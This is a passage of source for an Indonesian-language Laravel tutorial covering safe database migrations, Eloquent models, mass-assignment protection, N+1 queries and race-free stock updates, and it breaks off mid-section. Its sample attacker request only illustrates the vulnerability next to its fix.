          kode menulis ke KEDUA kolom, membaca dari nama

        RILIS 2 — pindahkan
          isi nama_lengkap dari nama, BERTAHAP dalam potongan,
          sebagai job terpisah — bukan di dalam migrasi
          kode mulai membaca dari nama_lengkap

        RILIS 3 — persempit
          jadikan nama_lengkap NOT NULL
          hapus kolom nama

        Mengganti namanya dalam SATU migrasi berarti: selama deploy berjalan,
        sebagian server menjalankan kode lama yang mencari kolom "nama"
        pada tabel yang kolomnya sudah tidak ada.
        `,
      ),
      p(
        'Alasan pengisian datanya dilakukan sebagai job terpisah dan bukan di dalam migrasi juga layak disebut. Migrasi berjalan sebagai bagian dari deploy, dan deploy punya batas waktu. Pengisian sepuluh juta baris di dalam migrasi membuat deploy-nya menggantung, dan bila ia dihentikan di tengah, tidak ada catatan tentang sampai mana ia sempat berjalan.',
      ),
      callout(
        'warning',
        'Migrasi yang sudah berjalan di tempat lain TIDAK boleh disunting',
        'Setelah sebuah migrasi dijalankan di mesin orang lain atau di produksi, mengubah isinya berarti dua mesin punya skema berbeda dengan catatan yang sama. Yang benar adalah menulis migrasi **baru** yang memperbaikinya. Menyunting yang lama hanya aman selama ia belum pernah keluar dari komputermu sendiri.',
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Migrasi terasa seperti pekerjaan sekali jalan, dan justru sifat sekali jalan itu yang membuat kesalahannya mahal.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Tidak pernah menjalankan `migrate:rollback`',
            '`down()` kan tinggal kebalikannya',
            '`down()` yang ditulis dari ingatan baru dipakai pada hari terburuk, dan pada hari itu ia gagal',
          ],
          [
            'Menyunting migrasi yang sudah dijalankan orang lain',
            'Lebih rapi daripada menambah migrasi baru',
            'Dua mesin punya skema berbeda dengan catatan yang sama. Tulis migrasi baru',
          ],
          [
            'Menambah kolom `NOT NULL` tanpa nilai bawaan',
            'Kolomnya memang wajib',
            'Gagal bila tabelnya sudah berisi. Tambahkan sebagai nullable, isi bertahap, baru perketat',
          ],
          [
            'Mengisi data dalam jumlah besar di dalam migrasi',
            'Sekalian satu tempat',
            'Deploy-nya menggantung dan bisa terputus tanpa catatan sampai mana. Pakai job terpisah berpotongan',
          ],
          [
            'Mengganti nama kolom dalam satu migrasi',
            'Cuma ganti nama',
            'Selama deploy, kode lama mencari kolom yang sudah tidak ada. Pakai perluas-pindahkan-persempit',
          ],
          [
            'Tidak memberi index pada kolom yang sering dicari',
            'Datanya masih sedikit',
            'Diukur, selisihnya 10,7 ms melawan 0,047 ms pada 300.000 baris, dan selisihnya TUMBUH',
          ],
        ],
      ),
      p(
        'Baris pertama bisa diubah menjadi kebiasaan yang murah dan menutup seluruh kelas masalahnya. Setiap kali menulis migrasi baru, jalankan `php artisan migrate`, lalu langsung `php artisan migrate:rollback`, lalu `php artisan migrate` sekali lagi. Tiga perintah itu memakan beberapa detik dan membuktikan bahwa `down()`-nya benar-benar bekerja, bukan sekadar terlihat benar.',
      ),
      references(
        {
          label: 'Database: Migrations',
          href: 'https://laravel.com/docs/12.x/migrations',
          source: 'Laravel',
          note: 'Bentuk `up()`/`down()`, perilaku batch, dan seluruh perintah artisan-nya.',
        },
        {
          label: 'Schema Builder — column types',
          href: 'https://laravel.com/docs/12.x/migrations#creating-columns',
          source: 'Laravel',
          note: 'Setiap tipe kolom beserta padanannya di database yang berbeda.',
        },
        {
          label: 'Foreign Key Constraints',
          href: 'https://laravel.com/docs/12.x/migrations#foreign-key-constraints',
          source: 'Laravel',
          note: '`foreignId()->constrained()` yang membuat constraint dan index sekaligus.',
        },
        {
          label: 'PostgreSQL — ALTER TABLE',
          href: 'https://www.postgresql.org/docs/17/sql-altertable.html',
          source: 'PostgreSQL',
          note: 'Yang sebenarnya dijalankan Schema Builder, dan kenapa expand–migrate–contract perlu.',
        },
      ),
    ],
  ),

  written(
    'eloquent-dasar',
    'Eloquent: model, CRUD, mass assignment',
    17,
    'ORM Laravel, beserta celah keamanan yang paling sering dibukanya.',
    [
      terms(
        {
          term: 'ORM',
          meaning:
            'Singkatan *Object-Relational Mapping* — lapisan yang memetakan baris tabel menjadi objek. Ia menyembunyikan query, **tapi tidak pernah menyembunyikan biayanya**. Itu sebabnya SQL diajarkan lebih dulu di Bab 2.',
        },
        {
          term: 'Eloquent',
          meaning:
            'ORM bawaan Laravel, memakai pola **Active Record**: model itu sendiri yang tahu cara menyimpan dan mengambil dirinya. `$catatan->save()` menulis ke database — tidak ada objek repository terpisah.',
        },
        {
          term: 'model',
          meaning:
            'Kelas yang mewakili satu tabel. Laravel menebak nama tabelnya dari nama kelas (`Catatan` → `catatans`), jadi tabel berbahasa Indonesia hampir selalu perlu `protected $table` ditulis eksplisit.',
        },
        {
          term: 'mass assignment',
          meaning:
            'Mengisi banyak kolom sekaligus dari satu array — `Catatan::create($request->all())`. Celah keamanan yang **paling sering dibuka ORM**: klien bisa menyisipkan `{"penulis_id":"orang-lain"}` atau `{"peran":"admin"}` ke dalam array itu.',
        },
        {
          term: '$fillable',
          meaning:
            'Daftar kolom yang **boleh** diisi massal — allow-list. Kolom di luar daftar diabaikan diam-diam. Ini pertahanan pertama Laravel terhadap mass assignment, dan ia harus ditulis sadar, bukan disalin.',
        },
        {
          term: '$guarded',
          meaning:
            'Kebalikan `$fillable` — daftar kolom yang **dilarang**. Berbahaya karena ia blocklist: kolom baru yang ditambahkan bulan depan otomatis **boleh** diisi massal. `$guarded = []` berarti semuanya boleh, dan itu setara mematikan pertahanannya.',
        },
        {
          term: '$hidden',
          meaning:
            'Daftar kolom yang **tidak pernah ikut** saat model diubah jadi JSON. Ia jaring pengaman untuk `password`, `remember_token`, dan kolom internal — tapi bukan pengganti memilih field sadar lewat API Resource.',
        },
        {
          term: 'casts',
          meaning:
            'Pemetaan tipe kolom database ke tipe PHP — `boolean`, `datetime`, `array`, atau sebuah enum. Tanpa itu, `diarsipkan` dari MySQL datang sebagai `0`/`1`, dan perbandingan `=== true` gagal diam-diam.',
        },
        {
          term: 'query builder vs Eloquent',
          meaning:
            'Eloquent mengembalikan **objek model**, sedangkan query builder (`DB::table`) mengembalikan objek biasa. Yang kedua lebih cepat dan cocok untuk laporan besar, dengan harga berupa tidak adanya relasi, cast, maupun event model.',
        },
      ),

      h2('Model'),
      code(
        'bash',
        `
        php artisan make:model Catatan -mfs   # + migration, factory, seeder
        `,
      ),
      code(
        'php',
        `
        <?php

        declare(strict_types=1);

        namespace App\\Models;

        use Illuminate\\Database\\Eloquent\\Model;
        use Illuminate\\Database\\Eloquent\\SoftDeletes;

        final class Catatan extends Model
        {
            use SoftDeletes;

            protected $table = 'catatan';

            // Daftar kolom yang BOLEH diisi massal — lihat peringatan di bawah.
            protected $fillable = ['judul', 'isi', 'diarsipkan'];

            // Kolom yang TIDAK PERNAH ikut ke JSON
            protected $hidden = ['catatan_internal'];

            protected function casts(): array
            {
                return [
                    'diarsipkan' => 'boolean',
                    'terbit_pada' => 'datetime',
                    'status' => StatusArtikel::class,
                ];
            }
        }
        `,
      ),
      p(
        'Sebuah model Eloquent mewakili **satu tabel**, dan hampir semua isinya berupa deklarasi, bukan kode yang berjalan. `$table` hanya perlu ditulis ketika nama tabelnya menyimpang dari tebakan Laravel — biasanya bentuk jamak bahasa Inggris dari nama kelas, yang jelas tidak berlaku untuk "catatan". `use SoftDeletes` adalah trait yang menyalakan pola soft delete: `delete()` akan mengisi `deleted_at` alih-alih menghapus baris, dan **setiap query dari model ini otomatis menyaring** yang sudah terhapus. Bandingkan dengan sub-bab 2.6, di mana `WHERE dihapus_pada IS NULL` harus kamu tulis di setiap query dan satu yang terlupa berarti data terhapus muncul kembali.',
      ),
      p(
        '`$fillable` dan `$hidden` menjaga dua arah yang berlawanan. `$fillable` mengatur apa yang boleh **masuk** dari input — allow-list yang menutup mass assignment, dibahas tepat di bawah. `$hidden` mengatur apa yang tidak boleh **keluar** ke JSON, jaring pengaman yang membuat `return $catatan` sekalipun tidak membocorkan kolom internal. Keduanya bekerja pada kolom yang berbeda dan tidak saling menggantikan.',
      ),
      p(
        "Method `casts()` menerjemahkan nilai mentah database menjadi tipe PHP yang benar. Tanpa `'diarsipkan' => 'boolean'`, MySQL mengembalikan `0` atau `1` dan pemeriksaan `if ($catatan->diarsipkan)` akan bernilai benar untuk keduanya — persis jebakan string `'false'` dari sub-bab 3.7. `'datetime'` mengubah string menjadi objek `Carbon` yang bisa diformat dan dibandingkan, dan `StatusArtikel::class` mengubah string menjadi enum, sehingga nilai status yang tidak dikenal langsung melempar alih-alih diam-diam beredar.",
      ),

      h2('Mass assignment — celah yang paling sering terbuka'),
      code(
        'php',
        `
        // Permintaan yang dikirim penyerang:
        // POST /api/catatan
        // { "judul": "Halo", "isi": "...", "penulis_id": 999, "diverifikasi": true }

        // BERBAHAYA: seluruh isi request masuk ke query
        Catatan::create($request->all());

        // Kalau $fillable memuat 'penulis_id', catatan itu tercatat
        // atas nama pengguna lain. Kalau ada kolom 'peran' di model User
        // dan ia fillable, penyerang bisa mengangkat dirinya jadi admin.
        `,
      ),
      code(
        'php',
        `
        // AMAN — tiga lapis sekaligus
        // 1. validated() hanya berisi field yang ada di aturan validasi
        // 2. $fillable membatasi kolom yang boleh diisi massal
        // 3. relasi user()->catatan() menetapkan penulis_id dari SESI, bukan dari input
        $catatan = $request->user()->catatan()->create($request->validated());
        `,
      ),
      p(
        'Perhatikan permintaan penyerang di blok pertama: ia menyertakan `penulis_id` dan `diverifikasi` yang **tidak pernah ada di formulirmu**. Itu tidak sulit dilakukan — cukup satu `curl`, karena formulir hanya mengatur apa yang dikirim browser, bukan apa yang bisa dikirim orang. `Catatan::create($request->all())` menyerahkan seluruhnya ke query, dan `$fillable` menjadi satu-satunya yang berdiri di antara input itu dan kolom di database.',
      ),
      p(
        'Blok kedua menutupnya dengan tiga lapis yang saling menopang, dan lapisan ketiga yang paling menentukan. `validated()` sudah membuang field yang tidak ada di aturan validasi, dan `$fillable` menyaring sekali lagi di tingkat model. Tetapi yang benar-benar menghilangkan pertanyaan "siapa pemiliknya" adalah `$request->user()->catatan()->create(...)`: karena catatannya dibuat **lewat relasi** pengguna yang sedang masuk, `penulis_id` diisi Laravel dari sesi dan tidak ada jalan bagi input untuk memengaruhinya. Bandingkan dengan `Catatan::create($request->validated())` yang tampak setara tetapi menyerahkan kepemilikan kepada isi body.',
      ),
      callout(
        'danger',
        'Jangan pernah menulis `$guarded = []`',
        'Itu berarti **semua kolom** boleh diisi dari input — termasuk `id`, `peran`, `saldo`, dan `email_terverifikasi`. Kamu akan menemukannya di banyak tutorial sebagai "biar praktis". Ia menghapus seluruh perlindungan mass assignment. Selalu daftarkan `$fillable` secara eksplisit.',
      ),

      h2('Operasi dasar'),
      code(
        'php',
        `
        // Baca
        $semua = Catatan::all();                      // hati-hati: seluruh tabel
        $satu = Catatan::find(1);                     // null kalau tidak ada
        $satu = Catatan::findOrFail(1);               // melempar 404
        $daftar = Catatan::where('diarsipkan', false)
            ->orderByDesc('created_at')
            ->paginate(20);

        // Buat
        $catatan = Catatan::create(['judul' => '...', 'isi' => '...']);

        // Ubah
        $catatan->update(['judul' => 'Judul baru']);

        // Hapus
        $catatan->delete();          // soft delete kalau pakai SoftDeletes
        $catatan->forceDelete();     // benar-benar dihapus
        `,
      ),
      p(
        'Tiga cara membaca satu baris punya perilaku berbeda saat datanya tidak ada, dan memilih yang tepat menghemat banyak `if`. `find()` mengembalikan `null`, sehingga kamu wajib memeriksanya sebelum memakai hasilnya. `findOrFail()` melempar pengecualian yang otomatis diterjemahkan Laravel menjadi respons `404` — inilah yang dipakai route model binding di balik layar. Komentar "hati-hati" pada `all()` perlu diperhatikan: ia menarik **seluruh tabel** ke memori, aman di tabel berisi sepuluh baris dan mematikan di tabel berisi sejuta.',
      ),
      p(
        'Rangkaian `where()->orderByDesc()->paginate(20)` menunjukkan sifat query builder Eloquent, yaitu tidak ada query yang dijalankan sampai method **terminal** dipanggil di ujungnya. `where` dan `orderByDesc` hanya menyusun query, dan `paginate(20)` yang mengeksekusinya sekaligus menambahkan `LIMIT` dan `OFFSET` beserta metadata jumlah halaman. Karena itu kamu bisa membangun query bertahap, misalnya menambahkan `where` di dalam `if`, tanpa memicu perjalanan bolak-balik ke database di setiap langkah.',
      ),
      p(
        'Dua baris terakhir berpasangan dengan trait `SoftDeletes` tadi. `delete()` hanya mengisi `deleted_at` sehingga barisnya masih ada dan bisa dipulihkan dengan `restore()`, sedangkan `forceDelete()` benar-benar menghapusnya dari tabel. Perhatikan penamaannya sengaja demikian: yang tidak bisa dibatalkan diberi nama yang lebih panjang dan lebih tegas, jadi tidak ada yang menjalankannya karena salah kira.',
      ),
      callout(
        'warning',
        '`Catatan::all()` pada tabel besar akan menghabiskan memori',
        'Ia memuat **setiap baris** ke memori PHP sekaligus. Untuk seratus baris tidak masalah; untuk satu juta, prosesnya mati. Pakai `paginate()` untuk API, atau `chunk()`/`lazy()` untuk pemrosesan batch.',
      ),

      h2('Query scope'),
      code(
        'php',
        `
        // Di dalam model
        public function scopeMilik(Builder $query, User $user): Builder
        {
            return $query->where('penulis_id', $user->id);
        }

        public function scopeAktif(Builder $query): Builder
        {
            return $query->where('diarsipkan', false);
        }

        // Dipakai — terbaca seperti kalimat
        $catatan = Catatan::milik($request->user())->aktif()->paginate(20);
        `,
      ),
      p(
        'Scope membuat aturan yang berulang jadi satu tempat. `scopeMilik` khususnya berguna: ia membuat pembatasan kepemilikan sulit dilupakan.',
      ),

      h2('Melihat SQL yang benar-benar dijalankan'),
      code(
        'php',
        `
        $query = Catatan::where('diarsipkan', false)->orderByDesc('created_at');

        dd($query->toSql());        // lihat SQL-nya
        dd($query->toRawSql());     // lengkap dengan nilai (Laravel 11+)
        `,
      ),
      p(
        'Perhatikan `$query` di baris pertama **belum** menjalankan apa pun, sesuai sifat query builder tadi bahwa tidak ada perjalanan ke database sampai method terminal dipanggil. Itulah yang membuat `toSql()` mungkin, sebab ia meminta Eloquent menuliskan SQL yang **akan** dijalankan tanpa menjalankannya. Keluarannya memakai placeholder `?` untuk setiap nilai, dan itu bukti langsung bahwa Eloquent memakai prepared statement sehingga query yang kamu susun lewatnya aman dari SQL injection secara bawaan.',
      ),
      p(
        'Karena `toSql()` menyembunyikan nilainya, `toRawSql()` ada untuk saat kamu perlu menyalin query itu apa adanya ke `psql` atau ke `EXPLAIN ANALYZE` dari sub-bab 2.3. Biasakan memeriksa keluarannya — terutama saat relasi terlibat, karena satu baris Eloquent yang terlihat sederhana bisa berubah menjadi puluhan query, dan itulah masalah N+1 di sub-bab berikutnya. Perhatikan `dd()` berarti *dump and die*: ia mencetak lalu **menghentikan** eksekusi, jadi ia alat penelusuran sementara yang tidak boleh tertinggal di kode yang dikirim.',
      ),
      callout(
        'tip',
        'ORM menyembunyikan query, bukan biayanya',
        'Satu baris Eloquent yang terlihat sederhana bisa menghasilkan query yang berat. Biasakan memeriksa SQL yang dihasilkan — terutama saat ada relasi yang terlibat, seperti di sub-bab berikutnya.',
      ),
      h2('Studi kasus di project nyata'),
      p(
        'Eloquent membuat pengambilan data begitu mudah sehingga biaya di baliknya berhenti terlihat, dan di situlah hampir semua masalah performanya lahir. Bentuk berikut terlihat bersih dan menghasilkan seratus satu perjalanan ke basis data.',
      ),
      code(
        'php',
        `
        // Terlihat seperti mengakses properti biasa. Bukan.
        $pesanan = Pesanan::latest()->limit(100)->get();

        foreach ($pesanan as $p) {
            echo $p->pelanggan->nama;        // <-- SATU query per baris
        }
        `,
      ),
      code(
        'text',
        `
        Diukur pada PostgreSQL 16.15 di bab database:

          biaya dasar + 1 query sepele : 23 ms
          1.000 query terpisah         : 76 ms   -> 53 ms untuk query-nya
          1 query dengan JOIN          : 26 ms   ->  3 ms untuk query-nya

        Itu di koneksi LOKAL, sekitar 0,053 ms per perjalanan bolak-balik.
        Ke basis data di zona ketersediaan lain, biayanya biasanya 1-2 ms,
        dan seribu perjalanan menjadi satu sampai dua DETIK untuk satu halaman.
        `,
        {
          caption:
            'Dijalankan sungguhan. Angkanya lokal, dan itulah yang membuat N+1 lolos dari pengujian.',
        },
      ),
      p('Perbaikannya satu kata dan tidak mengubah satu pun baris di tempat pemakaiannya.'),
      code(
        'php',
        `
        // Satu query tambahan untuk SELURUH pelanggan, bukan satu per baris.
        $pesanan = Pesanan::with('pelanggan')->latest()->limit(100)->get();

        // Untuk relasi bertingkat:
        Pesanan::with('pelanggan', 'item.produk')->get();

        // Untuk sekadar menghitung, JANGAN memuat seluruh relasinya:
        Pesanan::withCount('item')->get();     // -> $p->item_count
        `,
        {
          caption:
            'withCount menghindari memuat ribuan baris item hanya untuk mengetahui jumlahnya.',
        },
      ),
      p(
        'Yang lebih berharga daripada perbaikannya adalah cara menangkapnya sebelum sampai produksi, dan Laravel menyediakan satu baris untuk itu.',
      ),
      code(
        'php',
        `
        // AppServiceProvider::boot()
        // Relasi yang belum dimuat MELEMPAR saat mengembangkan, dan
        // berperilaku normal di produksi.
        Model::preventLazyLoading(! app()->isProduction());

        // Sekalian dua penjaga lain yang menutup kelas bug berbeda:
        Model::preventSilentlyDiscardingAttributes(! app()->isProduction());
        Model::preventAccessingMissingAttributes(! app()->isProduction());
        `,
        {
          caption:
            'Baris kedua menangkap field yang dibuang diam-diam karena tidak ada di $fillable.',
        },
      ),
      p(
        'Baris kedua itu menutup kegagalan yang sangat sering membingungkan, yaitu field yang dikirim formulir tetapi tidak pernah tersimpan karena tidak terdaftar di `$fillable`. Tanpa penjaga itu, Eloquent membuangnya **tanpa suara**, dan yang terlihat hanyalah kolom yang tetap kosong tanpa satu pun error.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Eloquent punya beberapa kegagalan yang bunyinya khas, dan yang paling berbahaya justru yang tidak berbunyi sama sekali.',
      ),
      code(
        'text',
        `
        1. Attempt to read property "nama" on null

           $pesanan->pelanggan->nama ketika relasinya kosong. Di PHP ini hanya
           PERINGATAN, jadi hasilnya NULL dan program TERUS BERJALAN —
           diukur di sub-bab PHP modern. Pakai ?-> atau muat dengan aman.

        2. Add [judul] to fillable property to allow mass assignment

           Muncul HANYA bila preventSilentlyDiscardingAttributes dinyalakan.
           Tanpa penjaga itu, field-nya dibuang diam-diam.

        3. SQLSTATE[23505]: Unique violation

           Kode SQLSTATE-nya diverifikasi sungguhan di bab database. Tangkap
           kodenya, bukan teks pesannya, lalu terjemahkan jadi 422 dengan
           keterangan per field.

        4. Memory exhausted

           Model::all() pada tabel berisi jutaan baris memuat SEMUANYA ke memori
           sebagai objek. Pakai chunk(), chunkById(), atau lazy().
        `,
      ),
      p(
        'Kegagalan keempat punya perbaikan yang berbeda-beda tergantung apa yang dikerjakan, dan memilih yang salah menghasilkan bug yang halus.',
      ),
      code(
        'php',
        `
        // BAHAYA: seluruh tabel jadi objek di memori.
        foreach (Pesanan::all() as $p) { /* ... */ }

        // chunk(): memproses per potongan. TAPI bila kamu MENGUBAH kolom yang
        // dipakai untuk mengurutkan, sebagian baris bisa TERLEWAT, sebab
        // OFFSET-nya bergeser setelah data berubah.
        Pesanan::where('status', 'baru')->chunk(500, function ($potongan) { /* ... */ });

        // chunkById(): aman untuk pemrosesan yang MENGUBAH data, sebab ia
        // bergerak berdasarkan id terakhir, bukan berdasarkan OFFSET.
        // Ini bentuk Eloquent dari keyset pagination yang diukur di bab database:
        // OFFSET 250000 membaca 250.020 baris, keyset membaca 20.
        Pesanan::where('status', 'baru')->chunkById(500, function ($potongan) {
            foreach ($potongan as $p) $p->update(['status' => 'diproses']);
        });
        `,
        {
          caption:
            'Perbedaan chunk dan chunkById baru terasa saat pemrosesannya mengubah kolom penyaringnya.',
        },
      ),
      p(
        'Kelompok kegagalan ketiga tidak menghasilkan error dan sudah diukur di bab database, yaitu **lost update** dari pola baca-hitung-tulis.',
      ),
      code(
        'php',
        `
        // RENTAN: dua permintaan bersamaan saling menimpa.
        $produk = Produk::find($id);
        $produk->stok = $produk->stok - $jumlah;   // dihitung di PHP
        $produk->save();

        // Diukur di bab database: saldo awal 100, dua proses masing-masing
        // mengurangi 10, hasil akhirnya 90 — bukan 80. Satu pengurangan HILANG.

        // AMAN: perhitungannya terjadi di basis data, sambil barisnya terkunci.
        Produk::where('id', $id)
            ->where('stok', '>=', $jumlah)
            ->decrement('stok', $jumlah);

        // decrement mengembalikan JUMLAH BARIS yang berubah. Nol berarti
        // syaratnya tidak terpenuhi, yaitu stoknya tidak cukup — dan itu
        // pemeriksaan dan pengurangan dalam SATU perintah, tanpa celah di antaranya.
        `,
        {
          caption:
            'Diukur sungguhan pada PostgreSQL 16.15 dengan dua proses yang berjalan bersamaan.',
        },
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Eloquent menyembunyikan SQL dengan sangat baik, dan hampir semua kesalahannya berupa lupa bahwa SQL-nya tetap ada.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Mengakses relasi di dalam perulangan',
            'Terlihat seperti properti biasa',
            'Satu query per baris. Pakai `with()`, dan nyalakan `preventLazyLoading` saat mengembangkan',
          ],
          [
            'Memakai `Model::all()`',
            'Paling singkat',
            'Seluruh tabel jadi objek di memori. Pakai `paginate()`, `chunkById()`, atau `lazy()`',
          ],
          [
            'Membaca stok, menghitung di PHP, lalu menyimpan',
            'Lebih mudah dibaca',
            'Diukur, dua proses bersamaan membuat satu pengurangan hilang. Pakai `decrement` dengan syarat',
          ],
          [
            'Memakai `chunk()` sambil mengubah kolom penyaringnya',
            'Namanya memang untuk memproses banyak',
            'Sebagian baris terlewat karena OFFSET-nya bergeser. Pakai `chunkById()`',
          ],
          [
            'Memuat seluruh relasi hanya untuk menghitungnya',
            '`count($p->item)` kan mudah',
            'Ribuan baris dimuat untuk menghasilkan satu angka. Pakai `withCount()`',
          ],
          [
            'Menambahkan `$appends` berisi perhitungan berat',
            'Praktis, otomatis ikut',
            'Perhitungannya berjalan untuk SETIAP baris di setiap daftar, termasuk yang tidak memerlukannya',
          ],
        ],
      ),
      p(
        'Baris terakhir punya akibat yang tumbuh diam-diam. Sebuah atribut yang ditambahkan lewat `$appends` ikut dihitung setiap kali modelnya diubah menjadi array atau JSON, termasuk pada daftar berisi seratus baris di endpoint yang sama sekali tidak memakai nilai itu. Bila perhitungannya menyentuh relasi, ia sekaligus menjadi N+1 yang tidak terlihat dari mana pun. Biarkan ia sebagai method biasa, lalu sertakan hanya di tempat yang memang membutuhkannya.',
      ),
      references(
        {
          label: 'Eloquent: Getting Started',
          href: 'https://laravel.com/docs/12.x/eloquent',
          source: 'Laravel',
          note: 'Model, operasi dasar, dan konvensi penamaan tabel.',
        },
        {
          label: 'Mass Assignment',
          href: 'https://laravel.com/docs/12.x/eloquent#mass-assignment',
          source: 'Laravel',
          note: 'Peran `$fillable` dan `$guarded`, langsung dari dokumentasi resminya.',
        },
        {
          label: 'Eloquent: Mutators & Casting',
          href: 'https://laravel.com/docs/12.x/eloquent-mutators',
          source: 'Laravel',
          note: 'Cast tipe kolom, termasuk cast ke enum PHP.',
        },
        {
          label: 'Mass Assignment Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Kenapa allow-list (`$fillable`) selalu lebih aman daripada blocklist (`$guarded`).',
        },
      ),
    ],
  ),

  written(
    'relasi-eloquent',
    'Relasi Eloquent',
    17,
    'Menyatakan hubungan antar tabel, dan menghindari N+1.',
    [
      terms(
        {
          term: 'hasMany',
          meaning:
            'Relasi 1-N dari sisi **induk** — satu pengguna punya banyak catatan. Foreign key-nya ada di tabel anak. Ini bentuk paling umum, dan yang paling sering jadi sumber N+1.',
        },
        {
          term: 'belongsTo',
          meaning:
            'Relasi dari sisi **anak** — satu catatan milik satu pengguna. Foreign key-nya ada di tabel ini sendiri. Ia pasangan `hasMany`, dan biasanya keduanya didefinisikan bersamaan.',
        },
        {
          term: 'belongsToMany',
          meaning:
            'Relasi N-N lewat **tabel pivot**. Laravel menebak nama pivotnya dari kedua nama tabel yang diurutkan alfabetis — jadi nama pivot berbahasa Indonesia hampir selalu perlu ditulis eksplisit sebagai argumen kedua.',
        },
        {
          term: 'lazy loading',
          meaning:
            'Relasi diambil **saat pertama kali diakses** — `$catatan->penulis` menembak query di situ juga. Nyaman, dan justru itu masalahnya: di dalam perulangan, ia berubah jadi N query tanpa ada yang terlihat salah di kode.',
        },
        {
          term: 'N+1',
          meaning:
            'Satu query mengambil N baris, lalu **N query lagi** untuk melengkapi masing-masing. 1000 catatan menjadi 1001 query. Cepat di data uji, runtuh di produksi — dan ORM membuatnya sangat mudah terjadi tanpa disadari.',
        },
        {
          term: 'eager loading',
          meaning:
            "Mengambil relasi **di depan** dengan `with('penulis')`. Query-nya jadi dua, yaitu satu untuk catatan dan satu untuk semua penulisnya sekaligus, berapa pun jumlah barisnya. Ini obat langsung untuk N+1.",
        },
        {
          term: 'preventLazyLoading',
          meaning:
            'Setelan yang membuat Laravel **melempar error** setiap kali sebuah relasi diakses tanpa di-eager-load. Dinyalakan hanya di development, ia mengubah N+1 dari masalah yang tak terlihat jadi kegagalan yang langsung tertangkap.',
        },
        {
          term: 'withCount',
          meaning:
            "Mengambil **jumlah** relasi tanpa memuat isinya — `withCount('komentar')` menghasilkan properti `komentar_count`. Jauh lebih murah daripada memuat seluruh komentar hanya untuk menghitungnya.",
        },
        {
          term: 'constrained eager loading',
          meaning:
            "Eager loading dengan syarat — `with(['komentar' => fn($q) => $q->latest()->limit(3)])`. Ia menutup kasus yang sering memaksa orang kembali ke lazy loading: butuh relasi, tapi tidak semuanya.",
        },
      ),

      h2('Mendefinisikan relasi'),
      code(
        'php',
        `
        // Satu pengguna punya banyak catatan
        final class User extends Model
        {
            public function catatan(): HasMany
            {
                return $this->hasMany(Catatan::class, 'penulis_id');
            }
        }

        // Satu catatan milik satu pengguna
        final class Catatan extends Model
        {
            public function penulis(): BelongsTo
            {
                return $this->belongsTo(User::class, 'penulis_id');
            }

            public function komentar(): HasMany
            {
                return $this->hasMany(Komentar::class);
            }

            public function tag(): BelongsToMany
            {
                return $this->belongsToMany(Tag::class, 'catatan_tag');
            }
        }
        `,
      ),
      p(
        'Perhatikan relasi 1-N ditulis **dua kali**, dari dua sisi yang berlawanan: `hasMany` di `User` dan `belongsTo` di `Catatan`. Keduanya menggambarkan hubungan yang sama, dan yang menentukan pilihan katanya adalah letak foreign key — `penulis_id` ada di tabel `catatan`, jadi `Catatan` yang "milik" (`belongsTo`) dan `User` yang "punya banyak" (`hasMany`). Ini persis pemahaman dari sub-bab 2.8, hanya dinyatakan dalam bentuk method.',
      ),
      p(
        "Argumen kedua `'penulis_id'` ditulis eksplisit karena Laravel secara bawaan menebak nama foreign key dari nama relasinya. Untuk relasi bernama `penulis` ia akan mencari kolom `penulis_id` yang kebetulan cocok, tetapi menuliskannya tetap lebih jujur ketika nama kolom tidak mengikuti nama modelnya. Perhatikan `komentar()` tidak menyebutnya sama sekali, karena `catatan_id` memang persis tebakan bawaan. Dan `belongsToMany` menyebut nama tabel pivot `catatan_tag`, yaitu tabel penghubung dari sub-bab 2.8 yang hanya berisi sepasang rujukan.",
      ),
      table(
        ['Relasi', 'Method', 'Foreign key ada di'],
        [
          ['1-N', '`hasMany`', 'Tabel anak'],
          ['N-1', '`belongsTo`', 'Tabel ini'],
          ['1-1', '`hasOne`', 'Tabel anak'],
          ['N-N', '`belongsToMany`', 'Tabel pivot'],
        ],
      ),

      h2('Memakainya'),
      code(
        'php',
        `
        $catatan = Catatan::find(1);
        $catatan->penulis->name;        // query dijalankan saat properti diakses
        $catatan->komentar;             // koleksi

        // Membuat lewat relasi: penulis_id otomatis terisi dari $user
        $user->catatan()->create(['judul' => '...', 'isi' => '...']);

        // Pivot
        $catatan->tag()->attach([1, 2, 3]);
        $catatan->tag()->sync([1, 2]);     // ganti seluruh isinya
        $catatan->tag()->detach(3);
        `,
      ),
      p(
        'Perhatikan beda `$catatan->penulis` tanpa kurung dan `$catatan->tag()` dengan kurung — ini sumber kebingungan yang sering. **Tanpa** kurung, Eloquent langsung menjalankan query dan memberimu hasilnya (sebuah model atau koleksi). **Dengan** kurung, yang kamu dapat adalah query builder-nya, sehingga bisa dilanjutkan dengan `where`, `create`, atau `attach`. Komentar pada baris kedua menandai hal penting: query itu dijalankan **saat properti diakses**, dan justru perilaku inilah yang melahirkan masalah N+1 di bawah.',
      ),
      p(
        'Tiga method pivot di akhir mudah tertukar dan akibatnya berbeda jauh. `attach` **menambah** tag tanpa menyentuh yang sudah ada, `detach` membuang yang disebutkan, dan `sync` **mengganti seluruh isinya** — tag yang tidak ada di daftar akan dilepas. Untuk formulir edit yang mengirim daftar tag lengkap, `sync` yang tepat; memakai `attach` di sana akan menumpuk tag lama dengan yang baru, dan memakai `sync` di tempat yang seharusnya `attach` akan diam-diam menghapus tag yang tidak ikut dikirim.',
      ),

      h2('N+1: masalah performa nomor satu di aplikasi ORM'),
      compare(
        {
          title: 'N+1',
          lang: 'php',
          code: `
          $catatan = Catatan::all();      // 1 query

          foreach ($catatan as $c) {
              echo $c->penulis->name;     // 1 query PER BARIS
          }

          // 100 catatan -> 101 query
          `,
          notes: ['Tidak terlihat di kode', 'Cepat dengan 5 data uji, runtuh dengan 5.000'],
        },
        {
          title: 'Eager loading',
          lang: 'php',
          code: `
          $catatan = Catatan::with('penulis')->get();
          // 2 query, berapa pun jumlah barisnya

          foreach ($catatan as $c) {
              echo $c->penulis->name;     // sudah dimuat
          }
          `,
          notes: ['Satu query tambahan, bukan N'],
        },
      ),
      p(
